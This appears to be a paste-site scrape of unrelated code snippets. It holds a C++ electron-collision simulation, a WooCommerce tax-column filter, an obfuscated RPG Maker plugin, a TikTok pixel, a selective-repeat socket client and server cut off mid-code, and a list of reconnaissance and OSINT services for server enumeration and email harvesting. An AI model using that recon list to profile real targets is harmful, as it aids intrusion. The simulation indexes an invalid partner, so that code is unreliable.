        double bin_start = Emin + i*bin_width;
//        printf(""%5.1f - %5.1f\t%d\n"", bin_start, bin_start + bin_width, histo_random[i]);
        file3 << i*bin_width << "" "" <<  static_cast<double>(histo_random[i])/electrons.size() << ""\n""; // dividing by n_e to get normalized distribution
    }


    for (int t = 0; t < steps; t++){

        std::ostringstream filename;
        filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

        std::ofstream file(filename.str());
        if (!file.is_open()){
        std::cerr << ""Error opening file: "" << filename.str() << std::endl;
        return 1;
        }

        // setting flags to false each timestep
        for (int j = 0; j < n_e; j++){
            electrons.at(j).collided = false;
        }

        for (int i = 0 ; i < n_e; i++){
            if (dis(gen) < P) {
                int partner = -1;
                int attempts = 0;

                while (attempts < n_e){
                    int candidate = pair(gen1);
                    if (candidate != i && !electrons.at(candidate).collided){
                        partner = candidate;
                        break;
                    }
                    attempts++;
                }

                if (partner != -1) {
                    electrons.at(i).collided = true;
                    electrons.at(partner).collided = true;
                }

                // ----   Collision energy redistribution module

                // first particle X Y Z initial velocities
                double V0_x_1 = electrons[i].vx;
                double V0_y_1 = electrons[i].vy;
                double V0_z_1 = electrons[i].vz;

                // second particle X Y Z initial velocities
                double V0_x_2 = electrons[partner].vx;
                double V0_y_2 = electrons[partner].vy;
                double V0_z_2 = electrons[partner].vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2)/2.0;
                double V0_rel_y = (V0_y_1 - V0_y_2)/2.0;
                double V0_rel_z = (V0_z_1 - V0_z_2)/2.0;

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (V0_x_1 + V0_x_2)/2.0;
                double V_cm_y = (V0_y_1 + V0_y_2)/2.0;
                double V_cm_z = (V0_z_1 + V0_z_2)/2.0;

                double V_cm = sqrt(V_cm_x*V_cm_x + V_cm_y*V_cm_y + V_cm_z*V_cm_z);

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of first particle

                double V_x_1 = V_cm_x + V_rel_x/2.0;
                double V_y_1 = V_cm_y + V_rel_y/2.0;
                double V_z_1 = V_cm_z + V_rel_z/2.0;

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //calculating final velocity of second particle

                double V_x_2 = V_cm_x - V_rel_x/2.0;
                double V_y_2 = V_cm_y - V_rel_y/2.0;
                double V_z_2 = V_cm_z - V_rel_z/2.0;

                double V_2 = sqrt(V_x_2*V_x_2 + V_y_2*V_y_2 + V_z_2*V_z_2);\

                // calculating final energies of first and second colliding particles

                electrons[i].energy = V_1*V_1*m_e/(2.0*k_b);
                electrons[partner].energy = V_2*V_2*m_e/(2.0*k_b);           

                // --- collision energy redistrubution module ends    

            }
        }

        for (int i = 0; i < n_e; i++){
//        filename << i << "" "" << electron_e[i] << ""\n"";
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < N)
            histo_maxwell[bin]++;
        }

        for (int i = 0; i < N; i++){
            double bin_start = Emin + i*bin_width;
            file << i*bin_width << "" "" <<  static_cast<double>(histo_maxwell[i])/electrons.size() << ""\n""; // later need to divide by total partcles number to get normalized distribution
            histo_maxwell[i] = 0;
        }

        file.close();

    }
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    for (int i = 0; i < histo_maxwell.size(); i++){
        double bin_start = Emin + i*bin_width;
//        printf(""%5.1f - %5.1f\t%d\n"", bin_start, bin_start + bin_width, histo_maxwell[i]);
        file4 << i*bin_width << "" "" <<  static_cast<double>(histo_maxwell[i])/electrons.size() << ""\n""; // dividing by partcles number to get normalized distribution
    }


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;


}"
TehzpG15,Order list total tax,palsushobhan,PHP,Monday 24th of March 2025 02:10:24 PM CDT,"add_filter( 'wcfm_orders_additional_info_column_label', function( $column_label ) {
    if (current_user_can('administrator')) {
        return 'Tax';
    }
	return $column_label;
});
add_filter( 'wcfm_orders_additonal_data_hidden', function ($is_allowed) {
    if (current_user_can('administrator')) {
        return false;
    }
    return true;
});
add_filter( 'wcfm_orders_additonal_data', function( $column_data, $order_id ) {
    if (current_user_can('administrator')) {
        $order = wc_get_order( $order_id );
        if ( $order->get_total_refunded() > 0 ) {
            $column_data_html = '<del>' . strip_tags( wc_price( $order->get_total_tax(), array( 'currency' => $order->get_currency() ) ) ) . '</del> <ins>' . wc_price( $order->get_total_tax() - $order->get_total_tax_refunded(), array( 'currency' => $order->get_currency() ) ) . '</ins>';
        } else {
            $column_data_html = wc_price( $order->get_total_tax(), array( 'currency' => $order->get_currency() ) );
        }
    }
	return $column_data_html;
}, 50, 2);"
zVWcuB0g,KZM_ChoiceTracker.js,KenzoMe92,JavaScript,Monday 24th of March 2025 02:07:34 PM CDT,"/*:
 * @target MZ
 * @plugindesc [v1.2] Tracks player choices and displays them in a flowchart with interactive map markers.
 * @author KenzoMe92
 * @url https://pluginkzmengine.wordpress.com/
 *
 * @help
 * This plugin records choices made by the player and displays them
 * in an interactive flowchart. It also marks events on the map that
 * are influenced by those choices.
 *
 * Features:
 * - Track player choices with optional parent-child branching.
 * - Supports irreversible and resettable choices.
 * - Visual flowchart with:
 *   - Customizable line colors for branch types.
 *   - Optional legend with configurable position and toggle.
 *   - Background dimming and bordered layout for readability.
 * - Map markers for flagged events:
 *   - Customizable sprite sheet for marked events.
 *
 * Plugin Parameters:
 * - Line Colors: Configure individual colors for positive, negative, and side branches.
 * - Map Marker Image: Sprite sheet to use when a marker is active on the map.
 *
 * Script Calls:
 *   $gameSystem.choiceTracker.addChoice(id, text, irreversible, parentId, branchType)
 *     → Registers a choice programmatically.
 *
 *   $gameSystem.choiceTracker.resetChoice(id)
 *     → Removes a non-irreversible choice.
 *
 *   $gameSystem.choiceTracker.setMapMarker(eventId, true|false)
 *     → Activates or deactivates a map event marker.
 *
 * 
 * @param MapMarkerImage
 * @text Map Marker Image
 * @type file
 * @dir img/characters
 * @desc The character sprite sheet to use as the marker when a map event is flagged.
 *
 * @param positive
 * @type string
 * @default green
 * @text Positive Branch Color
 * @desc Line color for positive branches.
 *
 * @param negative
 * @type string
 * @default orange
 * @text Negative Branch Color
 * @desc Line color for negative branches.
 *
 * @param side
 * @type string
 * @default blue
 * @text Side Branch Color
 * @desc Line color for side/conditional branches.
 *
* @command ShowFlowchart
* @text Show Flowchart
* @desc Opens the screen showing the player's choices in a flowchart.
*
* @command AddChoice
* @text Add Choice
* @desc Registers a new choice.
*
* @arg choiceId
* @type string
* @text Choice ID
* @desc Unique identifier for the choice.
*
* @arg choiceText
* @type string
* @text Choice Text
* @desc The label shown for this choice.
*
* @arg irreversible
* @type boolean
* @text Irreversible
* @desc Whether the choice persists across loops.
*
* @arg parentId
* @type string
* @text Parent Choice ID
* @desc Optional: the ID of the choice this branches from.
*
* @arg branchType
* @type select
* @option none
* @option positive
* @option negative
* @option side
* @text Branch Type
* @desc Type of branch (visual).
*
* @command ResetChoice
* @text Reset Choice
* @desc Removes a non-irreversible choice.
*
* @arg choiceId
* @type string
* @text Choice ID
* @desc The choice ID to reset.
*
* @command SetMapMarker
* @text Set Map Marker
* @desc Activates/deactivates a marker for a map event.
*
* @arg eventId
* @type number
* @text Event ID
* @desc ID of the event to mark.
*
* @arg state
* @type boolean
* @text Marker State
* @desc true = show marker, false = hide marker.
*/

(function(_0x341c77,_0x18d263){const _0x919af0=_0x20f6,_0x2b7e75=_0x341c77();while(!![]){try{const _0x40a21e=-parseInt(_0x919af0(0x146))/0x1+parseInt(_0x919af0(0x128))/0x2+parseInt(_0x919af0(0x106))/0x3+-parseInt(_0x919af0(0x137))/0x4+-parseInt(_0x919af0(0xee))/0x5*(-parseInt(_0x919af0(0x123))/0x6)+-parseInt(_0x919af0(0x119))/0x7*(parseInt(_0x919af0(0x13b))/0x8)+parseInt(_0x919af0(0x12b))/0x9;if(_0x40a21e===_0x18d263)break;else _0x2b7e75['push'](_0x2b7e75['shift']());}catch(_0x2bd51d){_0x2b7e75['push'](_0x2b7e75['shift']());}}}(_0x4dbd,0x3d5df),(function(){const _0x31b068=_0x20f6;class _0x4c81b1{constructor(){const _0x1512bb=_0x20f6;this['choices']={},this[_0x1512bb(0x125)]={};}['addChoice'](_0x11d53e,_0x1622e8,_0x1d7973=![],_0x27757e=null,_0x5e60c3='none'){this['choices'][_0x11d53e]={'text':_0x1622e8,'irreversible':_0x1d7973,'parentId':_0x27757e,'branchType':_0x5e60c3};}[_0x31b068(0x13c)](){const _0x22faa5=_0x31b068;return this[_0x22faa5(0x10a)];}['resetChoice'](_0x22d3e9){const _0x339958=_0x31b068;this[_0x339958(0x10a)][_0x22d3e9]&&!this[_0x339958(0x10a)][_0x22d3e9][_0x339958(0x13a)]&&delete this[_0x339958(0x10a)][_0x22d3e9];}['setMapMarker'](_0x305725,_0x5bfd33){const _0x1573e2=_0x31b068;this[_0x1573e2(0x125)][_0x305725]=_0x5bfd33;}[_0x31b068(0xfb)](_0x4f1941){const _0x4f3b59=_0x31b068;return!!this[_0x4f3b59(0x125)][_0x4f1941];}}const _0x4d053d=Scene_Map[_0x31b068(0x12a)][_0x31b068(0xf9)];Scene_Map[_0x31b068(0x12a)][_0x31b068(0xf9)]=function(){_0x4d053d['call'](this);};const _0x1c9972=Scene_Map[_0x31b068(0x12a)][_0x31b068(0x10c)];Scene_Map[_0x31b068(0x12a)][_0x31b068(0x10c)]=function(){const _0x33ec87=_0x31b068;$gameSystem[_0x33ec87(0x11e)]&&(DataManager[_0x33ec87(0xfc)](DataManager[_0x33ec87(0x126)]),$gameSystem[_0x33ec87(0x11e)]=![]),_0x1c9972[_0x33ec87(0x12f)](this);};const _0x5a9bb0=DataManager[_0x31b068(0x140)];DataManager[_0x31b068(0x140)]=function(){const _0x3c4089=_0x31b068;_0x5a9bb0['call'](this),!$gameSystem[_0x3c4089(0x11a)]&&($gameSystem['choiceTracker']=new _0x4c81b1());};const _0xfb244c=DataManager[_0x31b068(0xf2)];DataManager['extractSaveContents']=function(_0x3410a8){const _0x2b0060=_0x31b068;_0xfb244c[_0x2b0060(0x12f)](this,_0x3410a8);const _0x39bed4=$gameSystem[_0x2b0060(0x11a)];if(!(_0x39bed4 instanceof _0x4c81b1)){const _0x69ef4e=_0x39bed4||{},_0x458fb4=new _0x4c81b1();_0x458fb4['choices']=_0x69ef4e['choices']||{},_0x458fb4[_0x2b0060(0x125)]=_0x69ef4e[_0x2b0060(0x125)]||{},$gameSystem['choiceTracker']=_0x458fb4;}},PluginManager[_0x31b068(0x10f)](_0x31b068(0xeb),_0x31b068(0xf6),_0x194823=>{const _0x4f42c9=_0x31b068;SceneManager[_0x4f42c9(0x121)](_0x426798);}),PluginManager[_0x31b068(0x10f)](_0x31b068(0xeb),_0x31b068(0x134),_0x230d3=>{const _0x1540fd=_0x31b068,_0x12457a=_0x230d3['irreversible']==='true',_0x374c4d=_0x230d3[_0x1540fd(0x13f)]||null,_0x4a62f7=_0x230d3[_0x1540fd(0x105)]||_0x1540fd(0x122);$gameSystem[_0x1540fd(0x11a)]['addChoice'](_0x230d3[_0x1540fd(0x10e)],_0x230d3[_0x1540fd(0x110)],_0x12457a,_0x374c4d,_0x4a62f7),DataManager[_0x1540fd(0x126)]=DataManager['_lastAccessedId']||0x1,$gameSystem[_0x1540fd(0x11e)]=!![],StorageManager[_0x1540fd(0xed)](DataManager[_0x1540fd(0x126)]||0x1)&&DataManager[_0x1540fd(0xfc)](DataManager['_lastAccessedId']||0x1);}),PluginManager[_0x31b068(0x10f)](_0x31b068(0xeb),_0x31b068(0x100),_0x11ddc6=>{const _0x5ad76d=_0x31b068;$gameSystem[_0x5ad76d(0x11a)][_0x5ad76d(0x101)](_0x11ddc6[_0x5ad76d(0x10e)]),DataManager[_0x5ad76d(0x126)]=DataManager['_lastAccessedId']||0x1,$gameSystem[_0x5ad76d(0x11e)]=!![],StorageManager[_0x5ad76d(0xed)](DataManager[_0x5ad76d(0x126)]||0x1)&&DataManager[_0x5ad76d(0xfc)](DataManager[_0x5ad76d(0x126)]||0x1);}),PluginManager['registerCommand'](_0x31b068(0xeb),_0x31b068(0xf4),_0x34e125=>{const _0xe51db4=_0x31b068;$gameSystem[_0xe51db4(0x11a)][_0xe51db4(0x12d)](_0x34e125[_0xe51db4(0x135)],_0x34e125[_0xe51db4(0x11f)]===_0xe51db4(0xe9)),DataManager[_0xe51db4(0x126)]=DataManager[_0xe51db4(0x126)]||0x1,$gameSystem[_0xe51db4(0x11e)]=!![],StorageManager[_0xe51db4(0xed)](DataManager[_0xe51db4(0x126)]||0x1)&&DataManager[_0xe51db4(0xfc)](DataManager[_0xe51db4(0x126)]||0x1);});const _0x4cbdfa=Game_Event['prototype'][_0x31b068(0xf9)];Game_Event[_0x31b068(0x12a)][_0x31b068(0xf9)]=function(){const _0x110ea1=_0x31b068;_0x4cbdfa[_0x110ea1(0x12f)](this);if($gameSystem[_0x110ea1(0x11a)]&&this[_0x110ea1(0x118)]()){const _0x484582=this[_0x110ea1(0x135)]();$gameSystem[_0x110ea1(0x11a)]['isMapMarkerActive'](_0x484582)&&this[_0x110ea1(0x111)](_0x536597,0x0);}};const _0x167587=PluginManager[_0x31b068(0x11d)](_0x31b068(0xeb)),_0x536597=_0x167587[_0x31b068(0xf0)]||_0x31b068(0x143),_0x40f89b=_0x167587[_0x31b068(0xec)]!==_0x31b068(0x142),_0x235d59=JSON[_0x31b068(0x130)](_0x167587[_0x31b068(0x117)]||'{}'),_0x36af96=JSON[_0x31b068(0x130)](_0x167587[_0x31b068(0x11b)]||'{}'),_0x5098bc=Number(_0x167587['x']||Graphics[_0x31b068(0x139)]-0xdc),_0x202d0e=Number(_0x167587['y']||0x14),_0x3c726b=Number(_0x235d59['x']??_0x5098bc),_0x3a768e=Number(_0x235d59['y']??_0x202d0e);class _0x426798 extends Scene_MenuBase{[_0x31b068(0x144)](){const _0x16c980=_0x31b068,_0x22d268=new Sprite(new Bitmap(Graphics[_0x16c980(0x139)],Graphics[_0x16c980(0x13e)]));_0x22d268['bitmap'][_0x16c980(0x133)](_0x16c980(0x115)),this[_0x16c980(0xfd)](_0x22d268);}['create'](){const _0x1e9b71=_0x31b068;super[_0x1e9b71(0x124)](),this[_0x1e9b71(0x144)](),this[_0x1e9b71(0x129)]();}['update'](){const _0x409d27=_0x31b068;super[_0x409d27(0xf9)](),(Input['isTriggered']('cancel')||TouchInput[_0x409d27(0xfe)]())&&(SoundManager[_0x409d27(0x11c)](),SceneManager['pop']());}['createFlowchartSprite'](){const _0x320e28=_0x31b068,_0x3f1a2b=new Bitmap(Graphics['boxWidth'],Graphics[_0x320e28(0x13e)]),_0x475135=new Sprite(_0x3f1a2b);this['addChild'](_0x475135);if(_0x40f89b){_0x3f1a2b['fillRect'](_0x3c726b-0xa,_0x3a768e-0xa,0x104,0xbe,'rgba(0,\x200,\x200,\x200.5)'),_0x3f1a2b['drawRect'](_0x3c726b-0xa,_0x3a768e-0xa,0x104,0xbe,'white');const _0x5ccb76=0x1c;_0x3f1a2b[_0x320e28(0x112)](_0x320e28(0x131),_0x3c726b,_0x3a768e,0xc8,0x18),_0x3f1a2b[_0x320e28(0x103)](_0x3c726b,_0x3a768e+_0x5ccb76,0x10,0x10,_0x320e28(0x141)),_0x3f1a2b[_0x320e28(0x112)](_0x320e28(0xf3),_0x3c726b+0x18,_0x3a768e+_0x5ccb76,0xb4,0x18),_0x3f1a2b[_0x320e28(0x103)](_0x3c726b,_0x3a768e+0x2*_0x5ccb76,0x10,0x10,'red'),_0x3f1a2b[_0x320e28(0x112)](_0x320e28(0xf1),_0x3c726b+0x18,_0x3a768e+0x2*_0x5ccb76,0xb4,0x18),_0x3f1a2b[_0x320e28(0x138)](_0x3c726b,_0x3a768e+3.5*_0x5ccb76,_0x3c726b+0x28,_0x3a768e+3.5*_0x5ccb76,_0x36af96[_0x320e28(0x107)]||_0x320e28(0xf8),!![]),_0x3f1a2b['drawText'](_0x320e28(0xf7),_0x3c726b+0x30,_0x3a768e+0x3*_0x5ccb76+0x4,0xa0,0x18),_0x3f1a2b['drawLine'](_0x3c726b,_0x3a768e+4.5*_0x5ccb76,_0x3c726b+0x28,_0x3a768e+4.5*_0x5ccb76,_0x36af96[_0x320e28(0x136)]||_0x320e28(0x13d),![]),_0x3f1a2b[_0x320e28(0x112)](_0x320e28(0x120),_0x3c726b+0x30,_0x3a768e+0x4*_0x5ccb76+0x4,0xa0,0x18),_0x3f1a2b[_0x320e28(0x138)](_0x3c726b,_0x3a768e+5.5*_0x5ccb76,_0x3c726b+0x28,_0x3a768e+5.5*_0x5ccb76,_0x36af96['side']||_0x320e28(0x113),![]),_0x3f1a2b[_0x320e28(0x112)]('=\x20Side/Conditional\x20Branch',_0x3c726b+0x30,_0x3a768e+0x5*_0x5ccb76+0x4,0xa0,0x18);}const _0x14f6a9=$gameSystem[_0x320e28(0x11a)][_0x320e28(0x13c)](),_0x51680a=Object[_0x320e28(0x10d)](_0x14f6a9),_0x3defe0={},_0x577f10=0xa,_0xeb6951=0x50,_0x222631=0xf0,_0x12c69c=0x64,_0x518686=0x3c;_0x51680a[_0x320e28(0x109)]((_0x317f40,_0x1294b7)=>{const _0x190543=_0x320e28,_0x56b7bb=_0x12c69c+_0x1294b7%0x2*_0x222631,_0x532543=_0x518686+Math[_0x190543(0xf5)](_0x1294b7/0x2)*_0xeb6951,_0x261152=TouchInput['x']>=_0x56b7bb-0x8&&TouchInput['x']<=_0x56b7bb+0x8&&TouchInput['y']>=_0x532543-0x8&&TouchInput['y']<=_0x532543+0x8,_0x558d79=_0x261152?0x3:0x0,_0x4bc791=0x8+_0x558d79,_0x32c5eb=_0x14f6a9[_0x317f40];_0x3defe0[_0x317f40]={'x':_0x56b7bb,'y':_0x532543};const _0xfc9600=_0x32c5eb[_0x190543(0x13a)]?_0x190543(0x12c):'rgba(255,\x20255,\x20255,\x200.2)',_0x103c10=_0x32c5eb['irreversible']?'red':_0x190543(0x141);_0x3f1a2b[_0x190543(0xef)](_0x56b7bb-_0x4bc791,_0x532543-_0x4bc791,_0x4bc791*0x2,_0x4bc791*0x2,_0xfc9600),_0x3f1a2b['drawRect'](_0x56b7bb-_0x4bc791,_0x532543-_0x4bc791,_0x4bc791*0x2,_0x4bc791*0x2,_0x103c10),_0x3f1a2b[_0x190543(0x112)](_0x32c5eb[_0x190543(0x10b)],_0x56b7bb+0x14,_0x532543-0xa,0x190,0x18);}),_0x51680a['forEach'](_0x2acf7f=>{const _0x36cfdb=_0x320e28,_0x545823=_0x14f6a9[_0x2acf7f];if(_0x545823[_0x36cfdb(0x13f)]&&_0x3defe0[_0x545823['parentId']]){const _0x218406=_0x3defe0[_0x545823[_0x36cfdb(0x13f)]],_0x5257c6=_0x3defe0[_0x2acf7f];let _0x47f596=_0x36cfdb(0xea);if(_0x545823[_0x36cfdb(0x105)]===_0x36cfdb(0x107))_0x47f596=_0x36af96[_0x36cfdb(0x107)]||_0x36cfdb(0xf8);else{if(_0x545823[_0x36cfdb(0x105)]===_0x36cfdb(0x136))_0x47f596=_0x36af96[_0x36cfdb(0x136)]||'orange';else{if(_0x545823[_0x36cfdb(0x105)]===_0x36cfdb(0x116))_0x47f596=_0x36af96[_0x36cfdb(0x116)]||_0x36cfdb(0x113);}}_0x3f1a2b[_0x36cfdb(0x138)](_0x218406['x'],_0x218406['y'],_0x5257c6['x'],_0x5257c6['y'],_0x47f596,_0x545823[_0x36cfdb(0x105)]==='positive');}});}}Bitmap[_0x31b068(0x12a)][_0x31b068(0x103)]=function(_0x2add4d,_0x383b2d,_0x233e20,_0x127817,_0x23a2f2){const _0x33b22d=_0x31b068;this[_0x33b22d(0x108)][_0x33b22d(0x102)]=_0x23a2f2,this[_0x33b22d(0x108)][_0x33b22d(0xff)]=0x2,this[_0x33b22d(0x108)][_0x33b22d(0x114)](_0x2add4d,_0x383b2d,_0x233e20,_0x127817),this['_baseTexture']['update']();},Bitmap[_0x31b068(0x12a)][_0x31b068(0x138)]=function(_0x3d9f0f,_0x41b2bd,_0x207e38,_0x96a75,_0x35781c,_0x192a8b=![]){const _0x35fbd7=_0x31b068;this[_0x35fbd7(0x108)][_0x35fbd7(0x132)](),_0x192a8b?this[_0x35fbd7(0x108)][_0x35fbd7(0xfa)]([0x4,0x4]):this[_0x35fbd7(0x108)]['setLineDash']([]),this[_0x35fbd7(0x108)][_0x35fbd7(0x12e)](_0x3d9f0f,_0x41b2bd),this[_0x35fbd7(0x108)][_0x35fbd7(0x127)](_0x207e38,_0x96a75),this[_0x35fbd7(0x108)][_0x35fbd7(0x102)]=_0x35781c,this['context'][_0x35fbd7(0xff)]=0x2,this['context'][_0x35fbd7(0x145)](),this['context'][_0x35fbd7(0xfa)]([]),this['_baseTexture'][_0x35fbd7(0xf9)]();},window[_0x31b068(0x104)]=_0x426798;}()));function _0x20f6(_0x2c48e2,_0x1b388e){const _0x4dbdfc=_0x4dbd();return _0x20f6=function(_0x20f6dc,_0x9dc9bd){_0x20f6dc=_0x20f6dc-0xe9;let _0x5254b7=_0x4dbdfc[_0x20f6dc];return _0x5254b7;},_0x20f6(_0x2c48e2,_0x1b388e);}function _0x4dbd(){const _0x36cefb=['getChoices','orange','boxHeight','parentId','createGameObjects','white','false','!Other1','createFlowchartBackground','stroke','223352pxboLS','true','gray','KZM_ChoiceTracker','ShowLegend','exists','5540zCDlQv','fillRect','MapMarkerImage','=\x20Irreversible\x20Choice','extractSaveContents','=\x20Reversible\x20Choice','SetMapMarker','floor','ShowFlowchart','=\x20Positive\x20Branch','green','update','setLineDash','isMapMarkerActive','saveGame','addChild','isCancelled','lineWidth','ResetChoice','resetChoice','strokeStyle','drawRect','Scene_ChoiceFlowchart','branchType','1382406ogiiXT','positive','context','forEach','choices','text','terminate','keys','choiceId','registerCommand','choiceText','setImage','drawText','blue','strokeRect','rgba(0,\x200,\x200,\x200.5)','side','LegendPosition','event','805147mnVMYV','choiceTracker','LineColors','playCancel','parameters','_needsChoiceSave','state','=\x20Negative\x20Branch','push','none','1038SfEutR','create','mapMarkers','_lastAccessedId','lineTo','435634boLBlZ','createFlowchartSprite','prototype','1708695tLCPWh','rgba(255,\x200,\x200,\x200.2)','setMapMarker','moveTo','call','parse','Legend:','beginPath','fillAll','AddChoice','eventId','negative','1421620cpzuCX','drawLine','boxWidth','irreversible','16vTsVtF'];_0x4dbd=function(){return _0x36cefb;};return _0x4dbd();}"
1Arp0kia,Dumps,LVL23HT,CSS,Monday 24th of March 2025 01:58:07 PM CDT,"https://shodan.io – Server enumeration and device search
https://onyphe.io – Server & threat data aggregator
https://censys.io – Server reconnaissance and certificate data
https://ivre.rocks – Network recon and server fingerprinting

🔍 Dorking & Code Search:
https://google.com – Google Dorks for OSINT
https://grep.app – Search through open-source code
https://searchcode.com – Code snippets and functions
https://publicwww.com – Source code & HTML asset searches

⚠️ Threat Intelligence Platforms:
https://app.binaryedge.com
https://viz.greynoise.io
https://fofa.info
https://zoomeye.org
https://leakix.net
https://urlscan.io
https://socradar.io
https://pulsedive.com

🧱 Attack Surface Discovery:
https://app.netlas.io – Search engines for attack surface
https://fullhunt.io – Asset discovery and monitoring
https://binaryedge.io – Internet-wide scanning

📧 Email & People OSINT:
https://hunter.io – Email enumeration and verification
https://intelx.io – People & OSINT data explorer

📡 Other Specialized Tools:
https://wigle.net – WiFi network mapping
https://crt.sh – Certificate transparency logs
https://vulners.com – Vulnerability database"
TyFhmC6Y,Prima - Tiktok - Base Code,martinkingus,JavaScript,Monday 24th of March 2025 01:16:05 PM CDT,"<!-- TikTok Pixel Code Start -->
<script>
!function (w, d, t) {
  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=[""page"",""track"",""identify"",""instances"",""debug"",""on"",""off"",""once"",""ready"",""alias"",""group"",""enableCookie"",""disableCookie"",""holdConsent"",""revokeConsent"",""grantConsent""],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r=""https://analytics.tiktok.com/i18n/pixel/events.js"",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement(""script"")
;n.type=""text/javascript"",n.async=!0,n.src=r+""?sdkid=""+e+""&lib=""+t;e=document.getElementsByTagName(""script"")[0];e.parentNode.insertBefore(n,e)};


  ttq.load('CVGQ20RC77UAB8G2GLFG');
  ttq.page();
}(window, document, 'ttq');
</script>
<!-- TikTok Pixel Code End -->"
aFQSefB3,Selective Repeat Client,Bewin,C,Monday 24th of March 2025 12:57:48 PM CDT,"#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <sys/time.h>
#include <unistd.h>
#include <arpa/inet.h>
#define MAX 80
#define PORT 8080
#define SA struct sockaddr
struct timeval timeout;
void func(int sockfd, int nf, int ws)
{
    char buff[MAX];
    int ack, i = 0, n, k, w1 = 0, w2 = ws - 1, j, flag = 0, count_ack = 0;
    if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout)) < 0)
        perror(""setsockopt(SO_RCVTIMEO) failed"");
    for (i = 0; i < nf && i <= w2; i++)
    {
        bzero(buff, sizeof(buff));
        snprintf(buff, sizeof(buff), ""%d"", i);
        k = send(sockfd, buff, sizeof(buff), 0);
        printf(""Frame %d sent\n"", i);
    }
    while (1)
    {
        if (count_ack == nf)
        {
            strcpy(buff, ""Exit"");
            k = send(sockfd, buff, sizeof(buff), 0);
            break;
        }
        if (w2 - w1 != ws - 1 && flag == 0 && i != nf)
        {
            bzero(buff, sizeof(buff));
            snprintf(buff, sizeof(buff), ""%d"", i);
            k = send(sockfd, buff, sizeof(buff), 0);
            printf(""Frame %d sent\n"", i);
            w2++;
            i++;
        }
        flag = 0;
        bzero(buff, sizeof(buff));
        n = recv(sockfd, buff, MAX, 0);
        ack = atoi(buff);
        if (n > 0)
        {
            if (ack + 1 == nf)
            {
                printf(""Acknowledgement received: %d\n"", ack);
                count_ack++;
                bzero(buff, sizeof(buff));
                /*strcpy(buff, ""Exit"");
                k = send(sockfd, buff, sizeof(buff), 0);
                break;*/
            }
            else if (ack == -1)
            {
                printf(""Acknowledgement not received for %d\nResending frame\n"", w1);
                bzero(buff, sizeof(buff));
                snprintf(buff, sizeof(buff), ""%d"", w1);
                k = send(sockfd, buff, sizeof(buff), 0);
                printf(""Frame sent: %d\n"", w1);
            }
            else
            {
                w1++;
                printf(""Acknowledgement received: %d\n"", ack);
                count_ack++;
            }
        }
    }
}
void main()
{
    int sockfd, connfd, f, w;
    struct sockaddr_in servaddr, cli;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1)
    {
        printf(""Socket creation failed\n"");
        exit(0);
    }
    else
        printf(""Socket successfully created\n"");
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr(""127.0.0.1"");
    servaddr.sin_port = htons(PORT);
    timeout.tv_sec = 3;
    timeout.tv_usec = 0;
    if (connect(sockfd, (SA *)&servaddr, sizeof(servaddr)) != 0)
    {
        printf(""Connection with the server failed\n"");
        exit(0);
    }
    else
        printf(""Connected to the server\n"");
    printf(""Enter the number of frames: "");
    scanf(""%d"", &f);
    printf(""Enter the window size: "");
    scanf(""%d"", &w);
    func(sockfd, f, w);
    close(sockfd);
}"
NkjA3vjr,Selective Repeat Server,Bewin,C,Monday 24th of March 2025 12:57:28 PM CDT,"#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <unistd.h>
#define MAX 80
#define PORT 8080
#define SA struct sockaddr
struct timeval timeout;
void func(int connfd)
{
    char buff[MAX];
    int f, c, ack, next = 0;
    while (1)
    {
        sleep(1);
        bzero(buff, MAX);
        recv(connfd, buff, MAX, 0);
        if (strcmp(""Exit"", buff) == 0)
        {
            printf(""Exit\n"");
            break;
        }
        f = atoi(buff);
        c = rand() % 3;
        switch (c)
        {
        case 0:
            printf(""Frame %d not received\n"", f);
            ack = -1;
            printf(""Negative Acknowledgement sent: %d\n"", f);
            bzero(buff, MAX);
